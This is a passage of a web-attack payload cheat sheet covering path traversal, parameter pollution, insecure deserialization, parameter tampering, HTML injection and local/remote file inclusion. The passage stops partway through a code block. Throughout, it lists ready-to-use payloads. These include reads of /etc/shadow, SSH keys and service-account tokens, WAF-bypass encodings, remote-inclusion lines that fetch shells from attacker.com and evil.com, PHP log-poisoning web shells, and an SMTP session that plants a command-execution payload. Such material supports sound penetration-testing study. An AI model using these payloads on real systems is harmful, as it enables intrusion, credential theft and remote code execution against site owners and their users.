/etc/shadow
/etc/hosts
/proc/self/environ
/proc/version
/home/$USER/.bash_history
/home/$USER/.ssh/id_rsa
/run/secrets/kubernetes.io/serviceaccount/token

### **5. Target Files (Windows)**
c:/windows/system32/license.rtf
c:/boot.ini
c:/inetpub/wwwroot/web.config
c:/sysprep/sysprep.xml
c:/system32/inetsrv/metabase.xml

### **6. Log File Injection Targets**
/var/log/apache/access.log
/var/log/nginx/error.log
/usr/local/apache2/log/error_log

### **7. Common Parameters to Fuzz**

file, filename, path, filepath, page, doc, download, include, template, view, url, resource, dir, folder, asset

## 📂 Basic Directory Traversal
- **Single dot**: ./  
- **Double dot**: ../  
- **Triple dot**: ../../  
- **Root escape**: /../  
- **Windows backslash**: ..\\  
- **Mixed slashes**: ..\/..\\

## 🔑 Encoded Traversal Payloads
- **URL encoded dot dot**: %2e%2e/  
- **Double URL encoded**: %252e%252e/  
- **UTF-16 encoded**: %u002e%u002e/  
- **Overlong UTF-8**: %c0%ae%c0%ae/  
- **Null byte injection**: ../../etc/passwd%00

## 🗂️ Directory Listing Exploits
- **Basic listing**: /images/ → shows file list  
- **Hidden files**: /admin/.git/  
- **Config exposure**: /config/  
- **Backup files**: /backup/  
- **Temp files**: /tmp/  
- **Log files**: /logs/

## 🌀 Advanced Traversal Payloads
- **Absolute path injection**: /etc/passwd  
- **Windows system files**: C:\\Windows\\system32\\drivers\\etc\\hosts  
- **Chained traversal**: ....//....//etc/passwd  
- **Dot slash confusion**: ./././etc/passwd  
- **Mixed encoding**: %2e%2e%5c%2e%2e/etc/passwd

## 🧩 Parameter Injection
- **File parameter**: ?file=../../etc/passwd  
- **Path parameter**: ?path=../admin/  
- **Doc parameter**: ?doc=../../../../windows/win.ini  
- **Include parameter**: ?include=../../config.php  
- **Download parameter**: ?download=../../../secret.txt

## 📦 JSON / Body Tricks
- **JSON path injection**: {"file":"../../etc/passwd"}  
- **Nested JSON**: {"config":{"path":"../../admin"}}  
- **Array JSON**: {"files":["../../etc/passwd","../../config.php"]}  
- **Escaped JSON**: {"file":"..\/..\/etc\/passwd"}  
- **Base64 JSON**: {"file":"Li4vLi4vZXRjL3Bhc3N3ZA=="}
  
# HTTP Parameter Pollution

## Methodology

HTTP Parameter Pollution (HPP) is a web security vulnerability where an attacker injects multiple instances of the same HTTP parameter into a request. The server's behavior when processing duplicate parameters can vary, potentially leading to unexpected or exploitable behavior.
```ps1
/app?debug=false&debug=true
/transfer?amount=1&amount=5000
```
HPP can target two levels:

* Client-Side HPP: Exploits JavaScript code running on the client (browser).
* Server-Side HPP: Exploits how the server processes multiple parameters with the same name.

## 🔗 Basic HPP Payloads
- **Duplicate parameter**:  `?id=123&id=456` → Backend may process the second value (`456`) or concatenate both.  
- **Overriding parameter**:  `?redirect=whitelisted.com&redirect=evil.com` → Second parameter overrides the first.  
- **Multiple next parameters**:    `?next=https://safe.com&next=https://evil.com` → Some frameworks pick the last occurrence.

## 🧩 Encoding Tricks
- **Encoded ampersand**:  `?id=123%26id=456` → `%26` decoded as `&`, injecting a second parameter.  
- **Double encoding**:    `?id=123%2526id=456` → Double-decoded into two parameters.  
- **Null byte injection**:    `?file=report%00&type=pdf` → Null byte may truncate and allow pollution.  
- **Mixed encoding**:    `?next=https://safe.com%26next=https://evil.com` → Encoded injection bypasses filters.

## ⚙️ Path & Query Manipulation
- **Nested query**:  `?next=?redirect=https://evil.com` → Injects a new query inside a parameter.  
- **Chained parameters**:  `?url=https://safe.com?redirect=https://evil.com` → Pollution inside query string.  
- **Fragment injection**:  `?redirect=https://evil.com#next=https://safe.com` → Fragment may be ignored by server but parsed by client.  
- **Path confusion**:    `?path=/folder&path=/evil` → Multiple path parameters injected.

## 🗂️ Advanced HPP Payloads
- **JSON body pollution**:    `{"redirect":"https://safe.com","redirect":"https://evil.com"}` → Duplicate keys in JSON.  
- **Array injection**:  `?id[]=123&id[]=456` → Arrays may be parsed differently across frameworks.  
- **Header pollution**:  `?X-Forwarded-For=127.0.0.1&X-Forwarded-For=evil.com` → Multiple headers injected.  
- **Cookie pollution**:  `?cookie=sessionid=abc&cookie=sessionid=xyz` → Multiple cookies may override.  
- **Form pollution**:    `username=admin&username=evil` → Duplicate form fields submitted.

## 📦 Realistic Examples
- **Login bypass**:  `?user=admin&user=guest` → Some apps may authenticate as `guest`.  
- **Payment manipulation**:   `?amount=100&amount=1` → Polluted parameter may reduce payment amount.  
- **Redirect bypass**:  `?next=https://safe.com&next=https://evil.com` → Final redirect goes to attacker site.  
- **Search pollution**:  `?q=apple&q=banana` → Search results may be manipulated.  
- **Download pollution**:    `?file=report.pdf&file=evil.exe` → Backend may serve malicious file.
  
# HTTP Hidden Parameters

> Web applications often have hidden or undocumented parameters that are not exposed in the user interface. Fuzzing can help discover these parameters, which might be vulnerable to various attacks.

## Summary

* [Tools](#tools)
* [Methodology](#methodology)
    * [Bruteforce Parameters](#bruteforce-parameters)
    * [Old Parameters](#old-parameters)
* [References](#references)

Wordlist examples:

* [Arjun/large.txt](https://github.com/s0md3v/Arjun/blob/master/arjun/db/large.txt)
* [Arjun/medium.txt](https://github.com/s0md3v/Arjun/blob/master/arjun/db/medium.txt)
* [Arjun/small.txt](https://github.com/s0md3v/Arjun/blob/master/arjun/db/small.txt)
* [samlists/sam-cc-parameters-lowercase-all.txt](https://github.com/the-xentropy/samlists/blob/main/sam-cc-parameters-lowercase-all.txt)
* [samlists/sam-cc-parameters-mixedcase-all.txt](https://github.com/the-xentropy/samlists/blob/main/sam-cc-parameters-mixedcase-all.txt)

# 🔹 Basic HPP (HTTP Parameter Pollution)

* Duplicate parameter: ?id=123&id=456 → Backend may take last/first or merge.
* Override value: ?role=user&role=admin → Privilege escalation if last wins.
* Boolean flip: ?admin=false&admin=true → Logic confusion.
* Auth bypass: ?auth=0&auth=1 → Filter may check first only.
* Access override: ?access=guest&access=admin → Final privilege elevated.

# 🔹 Authentication & Authorization Tricks

* Hidden admin flag: ?isAdmin=true
* Role injection: ?role=admin
* Privilege escalation: ?access_level=999
* Feature unlock: ?premium=true
* Disable auth check: ?skipAuth=1
* Internal access: ?internal=true
* Dev mode: ?debug=true
* Impersonation: ?impersonate=admin
* Switch user: ?loginAs=admin
* Trust flag: ?trusted=true

# 🔹 Encoding Tricks (WAF Bypass)

* Encoded pollution: ?id=1%26id=2 → %26 = &
* Double encoding: ?id=1%2526id=2
* Null byte: ?file=report.pdf%00.exe
* Space bypass: ?role=admin%20
* Tab injection: ?role=admin%09
* Newline injection: ?role=admin%0a
* Mixed encoding: ?auth=true%26auth=false
* Unicode encoding: ?role=%61%64%6d%69%6e
* Case variation: ?RoLe=AdMiN
* Hex obfuscation: ?role=%41%64%6d%69%6e

# 🔹 Parameter Pollution Variants

* Array style: ?role[]=user&role[]=admin
* JSON-like: ?user[role]=admin
* Nested params: ?data[auth]=true
* Dot notation: ?user.role=admin
* Mixed delimiters: ?id=1;id=2
* Comma injection: ?id=1,2
* Pipe injection: ?id=1|2
* Multi-key chain: ?a=1&a=2&a=admin
* Encoded chain: ?id=1%26id=admin
* Duplicate cookies param: ?cookie=session=abc&cookie=session=admin

# 🔹 Path & Query Confusion

* Nested query: ?next=?redirect=https://evil.com
* Chained redirect: ?url=https://safe.com?next=https://evil.com
* Fragment injection: ?redirect=https://evil.com#safe.com
* Path override: ?path=/safe&path=/evil
* File override: ?file=report.pdf&file=backdoor.php
* API override: ?endpoint=/user&endpoint=/admin
* Redirect chaining: ?redirect=/home&redirect=//evil.com
* Relative path trick: ?path=../../admin
* Absolute override: ?path=/var/www&path=/etc/passwd
* Mixed path encoding: ?path=%2fadmin

# 🔹 Advanced Injection / Backend Abuse

* SQL style bypass: ?role=admin'--
* Boolean injection: ?admin=true OR 1=1
* Logic chaining: ?role=admin||true
* Multi-condition: ?access=admin&&1=1
* Comment bypass: ?role=admin/*
* JSON pollution: {"role":"user","role":"admin"}
* Prototype pollution: ?__proto__.admin=true
* Constructor injection: ?constructor.role=admin
* Config override: ?config[debug]=true
* Settings pollution: ?settings[admin]=1

# 🔹 HTTP Header / Hidden Surface Tricks

* Header duplication:  X-Forwarded-For: 127.0.0.1, X-Forwarded-For: evil.com
* Host override: Host: victim.com + Host: attacker.com
* Content-Type confusion: application/json + application/x-www-form-urlencoded
* Cookie override: session=abc; session=admin
* Authorization override: Authorization: user + Authorization: admin

# 🔹 Real-World Attack Use Cases

* Login bypass: ?user=admin&user=guest
* Payment tampering: ?amount=100&amount=1
* Role escalation: ?role=user&role=admin
* File download abuse: ?file=report.pdf&file=evil.exe
* Redirect bypass: ?next=safe.com&next=evil.com
* Feature unlock: ?plan=free&plan=enterprise
* Rate limit bypass: ?limit=10&limit=1000
* API privilege switch: ?scope=user&scope=all
* Debug exposure: ?mode=prod&mode=debug
* Admin panel access: ?page=home&page=admin

# 🔹 WAF Bypass Techniques (Combined)

* Case toggling: ?rOlE=AdMiN
* Encoding + pollution: ?role=user%26role=admin
* Parameter splitting: ?ro=admin&le=
* Mixed separators: ?role=admin;role=user
* Double param + encoding:  ?role=user&role=%61%64%6d%69%6e
* Comment obfuscation: ?role=admin/**/
* Junk padding: ?role=admin123 (backend trims)
* Alternate keys: ?user_role=admin
* Duplicate key order flip:  ?role=admin&role=user vs ?role=user&role=admin
* Proxy-based injection: add params via headers/body mismatch
----
# Insecure Deserialization

* [Deserialization Identifier](#deserialization-identifier)
* [POP Gadgets](#pop-gadgets)
* [Labs](#labs)
* [References](#references)

## Deserialization Identifier

Check the following sub-sections, located in other chapters :

* [Java deserialization : ysoserial, ...](Java.md)
* [PHP (Object injection) : phpggc, ...](PHP.md)
* [Ruby : universal rce gadget, ...](Ruby.md)
* [Python : pickle, PyYAML, ...](Python.md)
* [.NET : ysoserial.net, ...](DotNET.md)

| Object Type     | Header (Hex) | Header (Base64) |
|-----------------|--------------|-----------------|
| Java Serialized | AC ED        | rO              |
| .NET ViewState  | FF 01        | /w              |
| Python Pickle   | 80 04 95     | gASV            |
| PHP Serialized  | 4F 3A        | Tz              |

# 🔹 Modifying Serialized Objects

* Admin flag manipulation: `O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}` → Change `admin` boolean from `b:0` to `b:1` to gain admin access. [\[portswigger.net\]](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects)
* Session cookie tampering: Encoded cookie → decode → modify serialized object → re-encode → resend request → Access admin panel. [\[portswigger.net\]](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects)
* Privilege escalation via object field: Modify serialized attribute values → Application trusts modified object → Elevated privileges granted. [\[portswigger.net\]](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects)

# 🔹 Modifying Serialized Data Types

* Type juggling attack: `s:12:"access_token";s:"ABC123"` → `i:0` → Integer bypasses validation due to loose comparison. [\[portswigger.net\]](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types)
* Changing data type indicator: Replace `s` (string) with `i` (integer) in serialized data → Alters backend comparison logic. [\[portswigger.net\]](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types)
* Authentication bypass: `O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}` → Login as administrator without valid token. [\[portswigger.net\]](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types)

***

# 🔹 Using Application Functionality to Exploit Deserialization

* File deletion via object property: `{"avatar_link":"/home/carlos/morale.txt"}` → Application uses this path and deletes the file. [\[g4nd1v.github.io\]](https://g4nd1v.github.io/portswigger/portswigger-deserialization/)
* Business logic abuse: Modify serialized object fields that are later used in sensitive operations → Trigger unintended actions (e.g., delete file). [\[g4nd1v.github.io\]](https://g4nd1v.github.io/portswigger/portswigger-deserialization/)
* Dangerous method invocation: Serialized object passed into functionality → Application invokes method using attacker-controlled data. [\[g4nd1v.github.io\]](https://g4nd1v.github.io/portswigger/portswigger-deserialization/)

***

# 🔹 Arbitrary Object Injection in PHP

* Injecting new object type: Replace expected object with attacker-controlled class → Application instantiates it. [\[portswigger.net\]](https://portswigger.net/web-security/deserialization)
* Object property control: Modify class properties → Influence application behavior during execution. [\[portswigger.net\]](https://portswigger.net/web-security/deserialization)
* Object injection impact: Ability to supply arbitrary objects → Leads to logic abuse or code execution depending on available classes. [\[portswigger.net\]](https://portswigger.net/web-security/deserialization)

***

# 🔹 Exploiting Java Deserialization (Apache Commons)

* Serialized Java object in session: Base64 cookie → decode → reveals Java serialized object (`aced` header). [\[siunam321.github.io\]](https://siunam321.github.io/ctf/portswigger-labs/Insecure-Deserialization/deserial-5/)
* Gadget chain exploitation: Use tool to generate malicious serialized object → Send to server → Execute command. [\[siunam321.github.io\]](https://siunam321.github.io/ctf/portswigger-labs/Insecure-Deserialization/deserial-5/)
* Remote code execution: Replace session object with crafted payload → Server deserializes → Executes attacker-controlled action. [\[siunam321.github.io\]](https://siunam321.github.io/ctf/portswigger-labs/Insecure-Deserialization/deserial-5/)

***

# 🔹 Exploiting PHP Deserialization (Pre-built Gadget Chain)

* Framework identification: Extract framework info (e.g., Symfony) → Select matching gadget chain. [\[osintteam.blog\]](https://osintteam.blog/lab-exploiting-php-deserialization-with-a-pre-built-gadget-chain-portswigger-f7a7a915fdbf)
* Payload generation: Generate serialized object using PHPGGC → Encoded payload contains exploit. [\[osintteam.blog\]](https://osintteam.blog/lab-exploiting-php-deserialization-with-a-pre-built-gadget-chain-portswigger-f7a7a915fdbf)
* Signed cookie bypass: Recreate valid signature (HMAC) with leaked key → Server accepts malicious object. [\[osintteam.blog\]](https://osintteam.blog/lab-exploiting-php-deserialization-with-a-pre-built-gadget-chain-portswigger-f7a7a915fdbf)
* RCE via gadget chain: Inject signed malicious object → Server unserializes → Executes payload. [\[osintteam.blog\]](https://osintteam.blog/lab-exploiting-php-deserialization-with-a-pre-built-gadget-chain-portswigger-f7a7a915fdbf)

# 🔹 Exploiting Ruby Deserialization (Documented Gadget Chain)

* Use documented gadget chain: Identify known Ruby gadgets → Craft payload → Send serialized object
* Object execution flow:  Deserialization triggers chain of method calls → Leads to execution
*(Sources confirm use of documented gadget chains for exploitation, but do not provide a specific payload example.)* [\[portswigger.net\]](https://portswigger.net/web-security/deserialization/exploiting)

# 🔹 Developing Custom Gadget Chains (Java / PHP)

* Identify available classes: Analyze application → Find classes with useful methods
* Chain method calls: Combine multiple objects → Control execution flow
* Reach dangerous sink: Chain leads to function like command execution / file operation
*(Described as chaining method invocations into dangerous sinks; exact payloads depend on target code.)* [\[portswigger.net\]](https://portswigger.net/web-security/deserialization/exploiting)

# 🔹 PHAR Deserialization Attack

* PHAR wrapper abuse: `phar://file` used in file operation → Triggers deserialization
* File operation trigger: Functions like `file_exists()` on PHAR → Deserialize metadata
* Payload delivery: Upload crafted PHAR file → Trigger via application file handling
*(PHAR metadata deserialization is triggered when file functions interact with PHAR streams.)* [\[github.com\]](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/PHP.md)

# 🔹 Real-World Attack Outcomes (From Labs)

* Privilege escalation → Modify serialized object (`admin=true`)
* Authentication bypass → Change data types (`token=i:0`)
* File deletion → Control file path in object
* Remote code execution → Use gadget chains (Java/PHP)
* Arbitrary object execution → Inject attacker-controlled class

## Labs

* [PortSwigger - Modifying serialized objects](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects)
* [PortSwigger - Modifying serialized data types](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types)
* [PortSwigger - Using application functionality to exploit insecure deserialization](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization)
* [PortSwigger - Arbitrary object injection in PHP](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php)
* [PortSwigger - Exploiting Java deserialization with Apache Commons](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons)
* [PortSwigger - Exploiting PHP deserialization with a pre-built gadget chain](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain)
* [PortSwigger - Exploiting Ruby deserialization using a documented gadget chain](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-ruby-deserialization-using-a-documented-gadget-chain)
* [PortSwigger - Developing a custom gadget chain for Java deserialization](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-java-deserialization)
* [PortSwigger - Developing a custom gadget chain for PHP deserialization](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization)
* [PortSwigger - Using PHAR deserialization to deploy a custom gadget chain](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-phar-deserialization-to-deploy-a-custom-gadget-chain)
* [NickstaDB - DeserLab](https://github.com/NickstaDB/DeserLab)
----

# 5. Parameter Tampering (All Parameters Change)

**Description:** The Web Parameter Tampering attack is based on the manipulation of parameters exchanged between client and server in order to modify application data, such as user credentials and permissions, price and quantity of products, etc. Usually, this information is stored in cookies, hidden form fields, or URL Query Strings, and is used to increase application functionality and control. 

The parameter modification of form fields can be considered a typical example of Web Parameter Tampering attack. 
For example, consider a user who can select 
Form field values (combo box, check box, etc.) on an application page. When these values are submitted by the user, they could be acquired and arbitrarily manipulated by an attacker. 

**Targeted Parameters:**
```
mainly : price,amount,cost,discount,quantity, transaction  any user id's(priviledge escalation),number,strings,quality,delivery charges discounts etc... to change the parameters and forwards request to payment gateway.
using money we can search in burp if it is matches change the amount or above parameters then and intercept off.

Priviledge escalation attack senario login into account one for admin and another normal user in different browsers. access few admin resource similar to normal user function and paste that url in normal user browser if the normal user able to access admin functionalities there is a vulnerability.
```

### Attack Scenarios:
#### Example 1:
```
Qty=500&price=100  →  Qty=5&price=100
```
#### Example 2:
```
Cashback=0&amt=100 & qty=1
Cashback=100000&amt=100 & qty=1 there is parameter tempering on cashback
```
#### Example 3:
Modify the request in Burp Suite before the payment gateway.
do the nessasary steps and before an application is going to payment gateway do it there like send the request to repeater then change the amount. have to drop a  packet.
we can use the -amount also  such as 100  --99

### Bypass Methods:
1. sometimes amount should be encoding so copy the url and decode to change amount after that encode the payload
2. while leads to priviledge escalation for example normal user login into an application goto values like amount or profile information update if the cookie is weak configured goto inspect element-->storage-->change values like false-->true or change amount....
3. porfile pic upload with malicious link and geo-location
---
# 6. HTML Injection

**Description:** HTML injection occurs when an attacker can inject arbitrary HTML code into a vulnerable web page.

### Payloads: 1. Hyderlink click 2. html payload
```html
<h1>Vulnerable for HTML Injection</h1>
<A HREF="http://bing.com/">OffensiveHunter</A>
```
**DOM HTML Injection Example:**
```html
<script>
function setMessage(){
 var t=location.hash.slice(1);
 document.getElementById(t).innerText = "The DOM is now loaded and can be manipulated.";
}
window.onload = setMessage;
</script>
<a href="#message"> Show Here</a>
<div id="message">Showing Message</div>
```
# 🔹 Basic HTML Injection Payloads

* Simple tag injection: `<h1>Injected</h1>` → Direct HTML rendering in response.
* Breaking context (attribute): `"><h1>Injected</h1>` → Escapes attribute and injects HTML.
* Inline content injection: `<b>Admin Panel</b>` → Modifies UI content.
* Form injection: `<form><input type="text" name="admin"></form>` → Fake input fields.
* Image injection: `x` → Injects HTML element (no JS required).

# 🔹 UI Manipulation Attacks

* Fake login form: `<form action="https://evil.com"><input name="user"></form>` → Credential phishing.
* Button injection:`<button>Click Here</button>` → Misleading UI action.
* Overlay attack: `<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white"></div>` → Blocks real page.
* Input override: `<input value="admin">` → Pre-fill values.
* Hidden admin link: `/adminAdmin</a>` → Adds hidden navigation.

# 🔹 Attribute Context Injection

* Attribute break: `" ><h1>Injected</h1>` → Breaks out of attribute context.
* Inject into existing tag: `x<h1>Injected</h1>`
* Event attribute injection (if JS allowed): `" onmouseover="alert(1)`
* Style injection: `" style="color:red"`
* Class override: `" class="admin"`

# 🔹 HTML Injection + Data Exfiltration (No JS)

* Image-based exfiltration: `https://attacker.com/log?data=USER`
* Link-based stealing: `<a href="https://evil.com">Click</a>`
* Autofetch resource: `<iframe src="https://evil.com"></iframe>`
* Meta tag redirect: `<meta http-equiv="refresh" content="0;url=https://evil.com">`

# 🔹 DOM Manipulation via HTML Injection

* Inject iframe: `<iframe src="https://evil.com"></iframe>`
* Inject script tag placeholder (blocked sometimes): `<script>alert(1)</script>`
* Inject object tag:  `<object data="https://evil.com"></object>`
* Embed content: `<embed src="https://evil.com">`

# 🔹 Form & Input Injection

* Override existing form: `<form action="https://evil.com"><input name="password"></form>`
* Add hidden input: `<input type="hidden" value="admin">`
* Change button behavior: `<button formaction="https://evil.com">Submit</button>`
* Autofill trick: `<input value="hacked">`

# 🔹 WAF Bypass Techniques (HTML Injection)

## 🧩 Encoding Tricks

* HTML encoding: `&lt;h1&gt;Injected&lt;/h1&gt;` → Decoded by backend.
* Double encoding: `&amp;lt;h1&amp;gt;Injected&amp;lt;/h1&amp;gt;`
* URL encoding: `%3Ch1%3EInjected%3C/h1%3E`
* Mixed encoding: `%3Cimg src=x%3E`

## 🧩 Case & Obfuscation

* Case variation: `<H1>Injected</H1>`
* Broken tag: `<h1 / >Injected</h1>`
* Random spacing: `<h1    >Injected</h1>`
* Junk padding: `<h1>Injected123</h1>`

## 🧩 Tag Obfuscation

* Split tag: `<h` + `1>Injected</h1>`
* Null byte injection: `x%00`
* Comment breaking: `<h1><!--test-->Injected</h1>`
* Nested tags: `<div><h1>Injected</h1></div>`

## 🧩 Attribute-Level Bypass

* Broken attribute: `" >x`
* Inject inside attribute: `test" /><h1>Injected</h1>`
* Mixed quotes: `'"><h1>Injected</h1>`
* Encoded quote: `%22><h1>Injected</h1>`

## 🧩 Event & Browser Parsing Tricks

* Partial tag injection: `x`
* Alternate attributes: `<svg><text>Injected</text></svg>`
* Polyglot HTML: `<iframe/src=evil.com>`
* Non-standard tags: `<customtag>Injected</customtag>`

# 🔹 Real-World Attack Scenarios

* Fake login page: `<form action="https://evil.com"><input name="password"></form>` → Credential theft.
* UI defacement: `<h1>Website Hacked</h1>` → Visible defacement.
* Click hijacking: `<a href="https://evil.com">Download</a>` → Misleading links.
* Sensitive redirection: `<meta http-equiv="refresh" content="0;url=https://evil.com">`
* Admin confusion: `<div>Welcome Admin</div>` → Social engineering.
---

# 7. Local File Inclusion (LFI) and Remote File Inclusion (RFI)

### **Common LFI Parameters:**
```
file, document, folder, root, path, pg, style, pdf, template, php_path, doc, content, static
```
### **Basic LFI Exploitation:**

## Summary

- [Tools](#tools)
- [Local File Inclusion](#local-file-inclusion)
    - [Null Byte](#null-byte)
    - [Double Encoding](#double-encoding)
    - [UTF-8 Encoding](#utf-8-encoding)
    - [Path Truncation](#path-truncation)
    - [Filter Bypass](#filter-bypass)
- [Remote File Inclusion](#remote-file-inclusion)
    - [Null Byte](#null-byte-1)
    - [Double Encoding](#double-encoding-1)
    - [Bypass allow_url_include](#bypass-allow_url_include)
- [Labs](#labs)
- [References](#references)

## Tools

- [P0cL4bs/Kadimus](https://github.com/P0cL4bs/Kadimus) (archived on Oct 7, 2020) - kadimus is a tool to check and exploit lfi vulnerability.
- [D35m0nd142/LFISuite](https://github.com/D35m0nd142/LFISuite) - Totally Automatic LFI Exploiter (+ Reverse Shell) and Scanner
- [kurobeats/fimap](https://github.com/kurobeats/fimap) - fimap is a little python tool which can find, prepare, audit, exploit and even google automatically for local and remote file inclusion bugs in webapps.
- [lightos/Panoptic](https://github.com/lightos/Panoptic) - Panoptic is an open source penetration testing tool that automates the process of search and retrieval of content for common log and config files through path traversal vulnerabilities.
- [hansmach1ne/LFImap](https://github.com/hansmach1ne/LFImap) - Local File Inclusion discovery and exploitation tool

```powershell
http://example.com/index.php?page=../../../etc/passwd
```

### Null Byte

:warning: In versions of PHP below 5.3.4 we can terminate with null byte (`%00`).

```powershell
http://example.com/index.php?page=../../../etc/passwd%00
```

**Example**: Joomla! Component Web TV 1.0 - CVE-2010-1470

```ps1
{{BaseURL}}/index.php?option=com_webtv&controller=../../../../../../../../../../etc/passwd%00
```

### Double Encoding

```powershell
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```

### UTF-8 Encoding

```powershell
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
```
# 🔹 Basic LFI Payloads

* Linux file read: `../../../../etc/passwd` → Reads system user file.
* Windows file read:  `..\..\..\..\windows\win.ini` → Access Windows config.
* Absolute path:  `/etc/passwd` → Direct file inclusion attempt.
* PHP source exposure: `index.php` → If misconfigured, source code disclosure.
* Log file inclusion: `/var/log/apache2/access.log` → Useful for log poisoning.

# 🔹 Basic RFI Payloads

* Remote file include: `http://attacker.com/shell.txt` → Executes remote hosted code.
* HTTPS inclusion: `https://evil.com/payload.php` → Bypass HTTP-only filters.
* FTP inclusion: `ftp://attacker.com/shell.txt` → Alternate protocol.
* PHP wrapper remote: `http://evil.com/shell.php?cmd=id` → Command execution.

# 🔹 Directory Traversal Techniques

* Standard traversal: `../../../../etc/passwd`
* Deep traversal: `../../../../../../../../../etc/passwd`
* Mixed traversal:  `..//..//..//etc/passwd`
* Backslash traversal: ..\\..\\..\\windows\\win.ini`
* Nested traversal:  ....//....//etc/passwd`

# 🔹 LFI to RCE (Log Poisoning)

* Inject PHP into logs:  User-Agent: <?php system($_GET['cmd']); ?>`  → Include `/var/log/apache2/access.log`
* Trigger execution:  `/index.php?page=/var/log/apache2/access.log&cmd=id`
* SSH log poisoning:  Inject payload → include `/var/log/auth.log`
* Mail log poisoning:  Include `/var/log/mail.log`

# 🔹 PHP Wrappers Exploitation

* Base64 source disclosure:  `php://filter/convert.base64-encode/resource=index.php`
* Input stream execution:  `php://input` → Send POST payload with PHP code.
* Data wrapper:  data:text/plain,<?php system($_GET['cmd']); ?>`
* Zip wrapper:  zip://shell.zip#payload.php`
* Phar wrapper:  phar://shell.jpg` → Triggers deserialization.

# 🔹 File Upload + Inclusion

* Upload shell:  shell.php` → Include via LFI.
* Image polyglot:  shell.jpg` containing PHP code → bypass filters.
* Temp file inclusion: /tmp/phpXXXXXX` → Include uploaded temp file.
* Session file inclusion:  /var/lib/php/sessions/sess_<id>` → Inject code in session.

# 🔹 Null Byte Injection (Legacy)

* Null byte truncation:  `../../../../etc/passwd%00`
* Bypass extension filter: shell.php%00.jpg`
* Combined traversal + null:  ../../etc/passwd%00.php`

# 🔹 Encoding Tricks (WAF Bypass)

* URL encoding: `%2e%2e%2f%2e%2e%2fetc%2fpasswd`
* Double encoding: `%252e%252e%252fetc%252fpasswd`
* UTF-8 encoding: `%c0%ae%c0%ae%c0%af`
* Mixed encoding: `..%2f..%2f%65tc%2fpasswd`

# 🔹 Path & Filter Bypass Techniques

* Filter bypass with prefix:  `./../../../../etc/passwd`
* Suffix bypass:  ../../../../etc/passwd.`
* Add extension trick:  ../../../../etc/passwd%00.php`
* Path confusion:  /var/www/../../etc/passwd`
* Case variation (Windows):  ..\\..\\Windows\\Win.ini`

# 🔹 Advanced LFI Tricks

* Environment variables:  `/proc/self/environ` → Inject code via headers.
* Process file descriptor:  `/proc/self/fd/0` → Read input stream.
* Command history:  `/root/.bash_history`
* Config files:   `/etc/apache2/apache2.conf`

# 🔹 RFI Advanced Payloads

* Remote shell execution:  `http://evil.com/shell.txt?cmd=id`
* Parameterized RFI:  `http://evil.com/shell.php?cmd=whoami`
* CDN abuse:  `https://cdn.attacker.com/payload.php`
* Redirect chain:  `http://trusted.com/redirect?url=evil.com/shell.php`

# 🔹 WAF Bypass Techniques (LFI/RFI)

## 🧩 Obfuscation Tricks

* Mixed slashes:  `..\/..\/etc/passwd`
* Extra dots:  `....//....//etc/passwd`
* Path padding:  `../../../../etc/passwd////`
* Random insertion:  ..;/..;/..;/etc/passwd`

## 🧩 Encoding + Traversal

* Combined encoding: %2e%2e/%2e%2e/%65tc/passwd`
* Double encoded traversal:  %252e%252e%252f%252e%252e%252fetc%252fpasswd`
* UTF bypass: %c0%ae%c0%ae%c0%afetc%c0%afpasswd`

## 🧩 Wrapper Bypass

* Case variation:  PHP://filter/convert.base64-encode/resource=index.php`
* Mixed wrapper: `Php://Filter/...`
* Nested wrapper: php://filter/resource=php://input`

## 🧩 Extension Bypass

* Fake extension:  shell.php.jpg`
* Double extension:  `shell.php.png`
* Trailing dot:  shell.php.`
* Null byte (legacy): shell.php%00.jpg`

# 🔹 Real-World Attack Scenarios

* Sensitive file disclosure:    `../../../../etc/passwd` → Leak system users.
* Source code disclosure:  `php://filter/...` → Reveal application logic.
* Remote code execution:  Include uploaded shell or poisoned log.
* Credential theft:  Read `/etc/shadow`, config files.
* Full server compromise:  LFI → RCE via log/session poisoning.

### RCE via Mail

First send an email using the open SMTP then include the log file located at `http://example.com/index.php?page=/var/log/mail`.

```powershell
root@kali:~# telnet 10.10.10.10. 25
Trying 10.10.10.10....
Connected to 10.10.10.10..
Escape character is '^]'.
220 straylight ESMTP Postfix (Debian/GNU)
helo ok
250 straylight
mail from: mail@example.com
250 2.1.0 Ok
rcpt to: root
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
subject: <?php echo system($_GET["cmd"]); ?>
data2
.
```

In some cases you can also send the email with the `mail` command line.

```powershell
mail -s "<?php system($_GET['cmd']);?>" www-data@10.10.10.10. < /dev/null
```

### RCE via Apache logs

Poison the User-Agent in access logs:

```ps1
